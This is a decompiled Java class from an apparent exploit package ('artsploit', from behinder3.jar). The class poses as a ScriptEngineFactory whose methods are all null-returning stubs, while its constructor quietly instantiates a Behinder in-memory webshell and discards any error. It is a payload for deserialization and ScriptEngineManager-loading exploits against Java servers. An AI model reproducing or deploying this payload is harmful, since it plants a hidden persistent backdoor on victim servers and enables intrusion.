package artsploit;

import java.util.List;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;

/* loaded from: behinder3.jar:artsploit/AwesomeScriptEngineFactory.class */
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            new BehinderMemShell();
        } catch (Exception e) {
        }
    }

    public String getEngineName() {
        return null;
    }

    public String getEngineVersion() {
        return null;
    }

    public List<String> getExtensions() {
        return null;
    }

    public List<String> getMimeTypes() {
        return null;
    }

    public List<String> getNames() {
        return null;
    }

    public String getLanguageName() {
        return null;
    }

    public String getLanguageVersion() {
        return null;
    }

    public Object getParameter(String key) {
        return null;
    }

    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    public String getOutputStatement(String toDisplay) {
        return null;
    }

    public String getProgram(String... statements) {
        return null;
    }

    public ScriptEngine getScriptEngine() {
        return null;
    }
}